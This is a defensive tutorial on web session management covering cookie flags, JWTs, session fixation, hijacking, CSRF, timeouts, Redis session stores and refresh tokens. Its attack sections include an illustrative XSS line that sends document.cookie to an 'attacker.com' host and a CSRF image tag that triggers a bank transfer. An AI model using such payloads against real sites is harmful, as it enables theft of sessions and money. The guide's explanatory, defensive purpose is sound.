# Session Management: Cookies, Token Lifecycle, Attacks & Distributed Sessions

## Overview

**Session management** is the practice of maintaining authenticated user state across multiple requests. The two dominant approaches are **server-side sessions** (opaque session ID stored in database; client sends ID via cookie) and **token-based sessions** (stateless tokens carrying claims; client sends token with each request). Each has security, scalability, and operational trade-offs. Attacks like session fixation, session hijacking, and cross-site request forgery exploit weak session management. Proper cookie attributes, token signing, and device fingerprinting defend against these threats.

---

## Server-Side Sessions

### Architecture

1. **User logs in** with password
2. **Server validates** credentials
3. **Server creates session record** in database/memory:
   ```
   {
     "session_id": "abc123def456...",  // Random, cryptographically secure
     "user_id": 42,
     "created_at": "2024-01-15T10:00:00Z",
     "last_activity": "2024-01-15T10:05:00Z",
     "ip_address": "192.168.1.100",
     "user_agent": "Mozilla/5.0 ...",
     "data": { "roles": ["admin"], "theme": "dark" }
   }
   ```

4. **Server sends session ID to client** via HTTP Set-Cookie header
5. **Client stores session ID** in cookie (browser manages automatically)
6. **On subsequent requests**, client sends cookie; server looks up session, verifies freshness
7. **On logout**, server deletes session record; cookie becomes invalid

### Session Storage

| Storage | Pros | Cons |
|---------|------|------|
| **Database** | Persistent, shared across servers, audit trail | Slower (DB query per request), storage overhead |
| **Redis** | Fast in-memory, fits session lifecycle | Requires infrastructure, data lost on failure (fixable with persistence) |
| **Memory (in-process)** | Fastest, simple | No sharing across servers; loss on restart |

---

## Cookie Security Attributes

```
Set-Cookie: sessionid=abc123def456...; Path=/; Domain=.example.com; HttpOnly; Secure; SameSite=Strict; Max-Age=3600
```

### HttpOnly
- Cookie inaccessible via JavaScript (`document.cookie`)
- **Defense:** Prevents XSS (cross-site scripting) attacks from stealing session cookies
- **Trade-off:** Can't access session ID from JavaScript (often okay; backend handles auth)
- **Recommendation:** ✅ **Always set**

### Secure
- Cookie transmitted only over HTTPS
- **Defense:** Prevents man-in-the-middle (MITM) attacks; attacker can't intercept unencrypted cookie
- **Trade-off:** Requires HTTPS (no HTTP)
- **Recommendation:** ✅ **Always set** (except localhost for testing)

### SameSite
Controls when cookies are sent in cross-site requests.

| Value | Behavior | Defense |
|-------|----------|---------|
| **Strict** | Never send cross-site | Prevents CSRF; but breaks cross-site navigation (user clicks link, no auth) |
| **Lax** | Send on top-level navigation (click, redirect) but not form POST or fetch | Good balance: CSRF protection + usability |
| **None** | Send in all contexts | Must pair with `Secure`; should avoid |

**Recommendation:** ✅ `SameSite=Lax` or `Strict` (depending on app architecture)

### Path
- Cookie only sent for requests to this path or subpaths
- `Path=/` — sent for all requests
- `Path=/api/` — sent only for `/api/*`
- **Defense:** Limits cookie exposure if app has multiple origins
- **Recommendation:** ✅ Set appropriately (usually `/`)

### Domain
- Cookie sent to this domain and subdomains
- `Domain=.example.com` — sent to `example.com`, `app.example.com`, `api.example.com`
- Omitting `Domain` — cookie sent only to exact domain (more restrictive)
- **Defense:** Avoid overly broad domains; subdomain isolation
- **Recommendation:** ✅ Omit or use specific subdomain

### Max-Age / Expires
- Session duration
- `Max-Age=3600` — cookie expires in 3600 seconds (1 hour)
- `Expires=Wed, 15 Jan 2025 10:00:00 GMT` — absolute expiration time
- **Recommendation:** ✅ Set both for compatibility (Max-Age takes precedence)

---

## Token-Based Sessions (JWT)

### Architecture

1. **User logs in** with credentials
2. **Server creates JWT token** containing user claims (ID, roles, expiration)
3. **Server signs token** with secret key
4. **Server sends token** to client (usually in JSON response)
5. **Client stores token** in memory (JavaScript variable) or local storage
6. **On subsequent requests**, client includes token in `Authorization: Bearer <token>` header
7. **Server validates token signature** without database lookup; extracts claims
8. **On logout**, client deletes token; server doesn't need to do anything

### Token Structure

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiI0MiIsImVtYWlsIjoidXNlckBleGFtcGxlLmNvbSIsImlhdCI6MTcwNDghmdmIZXhwIjoxNzA0Nzs4MjAwfQ.X7q8f_K9...
```

Three base64url-encoded parts:

**Header:**
```json
{
  "alg": "HS256",
  "typ": "JWT"
}
```

**Payload (Claims):**
```json
{
  "sub": "42",              // Subject (user ID)
  "email": "user@example.com",
  "iat": 1704067200,        // Issued at
  "exp": 1704070800,        // Expiration (1 hour later)
  "iss": "https://auth.example.com",
  "aud": "my-app",
  "roles": ["user"]
}
```

**Signature:**
```
HMACSHA256(header + "." + payload, secret_key)
```

### Advantages
- **Stateless:** No database lookup required
- **Scalable:** No session storage bottleneck; works across multiple servers
- **Cross-origin:** Can be used for mobile apps, SPAs, APIs

### Disadvantages
- **No revocation:** Token valid until expiration; can't instantly invalidate it
- **Storage risk:** If token stored in local storage, XSS steals it (no HttpOnly protection)
- **Size:** Token can be large; must be included in every request
- **Signature vulnerabilities:** Weak secrets, algorithm confusion attacks

---

## Session Attacks and Defense

### Session Fixation

**Attack:**
1. Attacker creates session (not logged in): `sessionid=attacker_chooses_this`
2. Attacker tricks victim into using that session ID (via malicious link, email)
3. Victim logs in with the fixed session ID
4. Attacker uses the same session ID to access victim's account

**Example:**
```
Attacker sends: https://bank.com/login?sessionid=fixed123
Victim logs in, attacker accesses bank.com with sessionid=fixed123 cookie
```

**Defense: Session Regeneration**
- On every login, generate a NEW session ID
- Invalidate old session ID
- Old session ID no longer works (even if attacker had it)

```python
# Pseudo-code
old_session_id = request.cookies.get("sessionid")
# Validate old session
if not validate_session(old_session_id):
    reject_login()

# Delete old session
delete_session(old_session_id)

# Create new session
new_session_id = generate_secure_random()
create_session(new_session_id, user_id=user.id)

# Send new session ID to client
response.set_cookie("sessionid", new_session_id, ...)
```

✅ **Best practice:** Always regenerate session on login, privilege elevation, or sensitive operations.

### Session Hijacking (MITM)

**Attack:**
1. Attacker intercepts unencrypted traffic (public WiFi, compromised network)
2. Attacker captures session cookie: `sessionid=abc123...`
3. Attacker uses stolen cookie to log in as victim

**Defense: HTTPS + Secure Flag**
- HTTPS encrypts entire request (cookies encrypted in transit)
- `Secure` flag: browser sends cookie only over HTTPS
- Combination: Attacker cannot intercept unencrypted cookie

✅ **Best practice:** Always use HTTPS in production; set `Secure` flag.

### Cross-Site Request Forgery (CSRF)

**Attack:**
1. User logs into `bank.com`, receives auth cookie
2. User visits attacker site `evil.com` (still logged into bank)
3. `evil.com` contains: `<img src="https://bank.com/transfer?to=attacker&amount=1000">`
4. Browser automatically sends auth cookie with image request
5. Bank transfers money to attacker

**Defense: SameSite Cookies**

```
Set-Cookie: sessionid=abc123; SameSite=Strict
```

- `SameSite=Strict`: Cookie never sent cross-site; request fails
- Attacker can't exploit CSRF because cookie isn't attached to cross-site request

**Defense: CSRF Tokens**
```html
<form method="POST" action="/transfer">
  <input type="hidden" name="csrf_token" value="random_token_123">
  <input type="text" name="amount" placeholder="Amount">
  <button type="submit">Transfer</button>
</form>
```

Server validates:
1. CSRF token matches what's stored in session
2. Token is fresh
3. Token correct → process request
4. Token missing/incorrect → reject with 403

✅ **Best practice:** `SameSite=Lax` or `Strict` (modern defense); add CSRF tokens for older browsers.

### XSS Cookie Theft

**Attack:**
```javascript
// Attacker injects JavaScript
fetch("https://attacker.com/steal?cookie=" + document.cookie)
```

Attacker steals all cookies, including auth.

**Defense: HttpOnly Flag**
- Cookie inaccessible via JavaScript
- Injection can't read `document.cookie`

✅ **Best practice:** Always set `HttpOnly` on auth cookies.

### Session Fixation Detection

**Method: Device Fingerprinting**

Store client fingerprint in session:
```python
fingerprint = hash(user_agent + ip_address + accept_language)
session["fingerprint"] = fingerprint

# On each request
new_fingerprint = hash(user_agent + ip_address + accept_language)
if new_fingerprint != session["fingerprint"]:
    # Possible hijacking or attacker using fixed session from different device
    reject_or_require_mfa()
```

⚠️ **Caution:** Fingerprinting can be brittle (IP changes, user-agent changes); use as second signal, not sole defense.

---

## Session Invalidation Strategies

### Logout Endpoints

```
POST /logout
```

Server-side:
1. Find session by ID
2. Delete session record
3. Send response to client
4. Client deletes session cookie and local tokens

### Session Timeouts

**Absolute Timeout:**
- Session expires after fixed duration (e.g., 1 hour)
- User must log in again after timeout
- Reduces damage if session stolen

**Idle Timeout:**
- Session expires after inactivity period (e.g., 15 minutes no requests)
- Active users stay logged in; inactive users logged out
- Implementation: Update `last_activity` on each request; compare with threshold

```python
if (now - session["last_activity"]) > idle_timeout:
    delete_session(session_id)
    return 401_Unauthorized
```

**Recommended settings:**
- Absolute: 4-8 hours
- Idle: 15-30 minutes
- High-security (banking): 10-15 minute absolute, 5 minute idle

### Concurrent Session Control

**Limit:** User can only have one active session at a time.

**Implementation:**
```python
def login(username, password):
    # Find any existing session for this user
    old_session_id = find_session_by_user(user.id)
    if old_session_id:
        delete_session(old_session_id)  # Log out other login
    
    # Create new session
    new_session_id = generate_secure_random()
    create_session(new_session_id, user_id=user.id)
    return new_session_id
```

**Trade-off:**
- ✅ Security: Prevents credential sharing, limits hijacking window
- ❌ UX: User logged out from phone when logging in from desktop

---

## Distributed Sessions (Redis)

### Problem
In distributed systems with multiple servers, session stored on Server A is unavailable to Server B:

```
User → Load Balancer → Server A (creates session, stores locally)
Later: User → Load Balancer → Server B (session not found; user logged out)
```

### Solution: Redis Session Store

```
User → Load Balancer → Server A (creates session, stores in Redis)
Redis (central session store, network accessible)
Later: User → Load Balancer → Server B (looks up session in Redis)
Server B (session found; continues authenticated session)
```

### Implementation

**Session creation:**
```python
import redis

r = redis.Redis(host="redis-server.example.com", port=6379)

session_id = generate_secure_random()
session_data = {
    "user_id": user.id,
    "created_at": now(),
    "roles": user.roles
}

# Store in Redis with expiration (6 hours)
r.setex(f"session:{session_id}", 6*3600, json.dumps(session_data))

response.set_cookie("sessionid", session_id)
```

**Session lookup:**
```python
session_id = request.cookies.get("sessionid")
session_data = r.get(f"session:{session_id}")

if not session_data:
    return 401_Unauthorized

user_id = json.loads(session_data)["user_id"]
# Continue authenticated
```

### High Availability

**Redis Clustering:**
- Multiple Redis nodes; session replicated
- If one node fails, session still accessible
- Tools: Redis Sentinel, Redis Cluster

**Session Sticky Sessions (Alternative):**
- Load balancer routes user to same server
- Session stored locally on that server
- If server fails, session lost (trade-off)

---

## Token Refresh and Long-Lived Sessions

### Problem
- Short-lived tokens expire; users logged out frequently (UX bad)
- Long-lived tokens increase hijacking window (security bad)

### Solution: Refresh Token Pattern

Two tokens:
1. **Access Token:** Short-lived (15 minutes), used for API requests
2. **Refresh Token:** Long-lived (7 days), used to get new access tokens

```javascript
// Initial login
POST /login { credentials }
→ Response: { access_token, refresh_token }

// Subsequent API call
GET /api/profile Authorization: Bearer <access_token>

// Access token expires after 15 minutes
GET /api/profile Authorization: Bearer <expired_token>
→ 401 Unauthorized (token expired)

// Client uses refresh token to get new access token
POST /refresh { refresh_token }
→ Response: { access_token } (new 15-minute token)

// Continue API calls
GET /api/profile Authorization: Bearer <new_access_token>
→ 200 OK
```

### Refresh Token Rotation (Enhanced Security)

Every time refresh token is used, issue a new refresh token:

```javascript
POST /refresh { refresh_token: "old_token" }
→ Response: { access_token, refresh_token: "new_token" }
```

**Defense:** If old refresh token stolen and used by attacker, legitimate user gets new token; attacker's old token becomes invalid.

### Refresh Token Storage

| Method | Pros | Cons |
|--------|------|------|
| **HttpOnly Cookie** | Secure (XSS-immune); automatic sending | CSRF risk; harder to access from SPA |
| **Local Storage** | Easy to access from JavaScript; no CSRF | XSS can steal it; not automatic |
| **In-Memory** | Can't survive page refresh; XSS can't persist | Poor UX; users logged out on refresh |

**Recommendation:** HttpOnly cookie for web apps; secure storage library for mobile.

---

## Session Security Checklist

- ✅ Use HTTPS; set `Secure` flag on cookies
- ✅ Set `HttpOnly` to prevent XSS theft
- ✅ Set `SameSite=Lax` or `Strict` to prevent CSRF
- ✅ Regenerate session ID on login
- ✅ Validate session freshness (check creation time, last activity)
- ✅ Set absolute and idle timeouts
- ✅ Implement logout (delete session)
- ✅ Use strong random session IDs (128 bits minimum)
- ✅ For distributed systems, use Redis or similar session store
- ✅ Monitor suspicious patterns (multiple IPs, unusual user agents)
- ✅ Log session creation/deletion for audit trail

---

## See Also

- [web-authentication-patterns.md](web-authentication-patterns.md) — session vs token comparison
- [security-jwt-tokens.md](security-jwt-tokens.md) — JWT structure and vulnerabilities
- [security-authentication-attacks.md](security-authentication-attacks.md) — XSS, CSRF, hijacking details
- [auth-multi-factor.md](auth-multi-factor.md) — add MFA to sessions for defense-in-depth